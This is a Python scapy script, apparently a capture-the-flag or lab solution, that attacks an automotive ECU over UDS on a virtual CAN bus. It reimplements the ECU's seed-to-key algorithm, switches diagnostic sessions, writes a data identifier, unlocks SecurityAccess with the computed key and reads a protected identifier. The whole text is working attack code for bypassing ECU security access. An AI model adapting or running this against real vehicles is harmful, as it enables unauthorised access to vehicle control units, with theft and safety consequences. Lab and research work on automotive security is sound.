from scapy.contrib.automotive.uds import UDS, UDS_DSC, UDS_RDBI, UDS_SA, UDS_WDBI
from scapy.contrib.isotp import ISOTPNativeSocket
from scapy.all import Raw

# Reimplement session 3 key generation
def extended(seed: bytes) -> int:
    if len(seed) != 4:
        raise ValueError("Seed must be exactly 4 bytes")

    a = 0xcbf29ce484222325
    b = 0x100000001b3
    result = 0

    for i in range(4):
        value = seed[i]
        a ^= value
        a *= b

    for i in range(3, -1, -1):
        value = seed[i]
        a ^= value
        a *= b

    c = b"Drivesec"

    for i in range(8):
        byte = (a >> (56 - i * 8)) & 0xFF
        xored = byte ^ c[i]
        result |= xored << (56 - i * 8)

    return result

sock = ISOTPNativeSocket("vcan0", 0x769, 0x742, basecls=UDS, padding=True, fd=False)

# Change to 3
sock.sr1(UDS()/UDS_DSC(diagnosticSessionType=3), verbose=0)

# Change to 2
sock.sr1(UDS()/UDS_DSC(diagnosticSessionType=2), verbose=0)

# Modify DID
sock.sr1(UDS() / UDS_WDBI(dataIdentifier=0xF132) / Raw(b'\x03'),verbose=0)

# Authenticate
pkt = sock.sr1(UDS()/UDS_SA(securityAccessType=3), verbose=0)
key = extended(pkt.securitySeed)
key = key.to_bytes(8, "big")

sock.sr1(UDS()/UDS_SA(securityAccessType=4, securityKey=key), verbose=0)

# Read data
pkt = UDS() / UDS_RDBI(identifiers=0x7a69)
response = sock.sr1(pkt, verbose=0)
print(bytes(response)[3:].decode())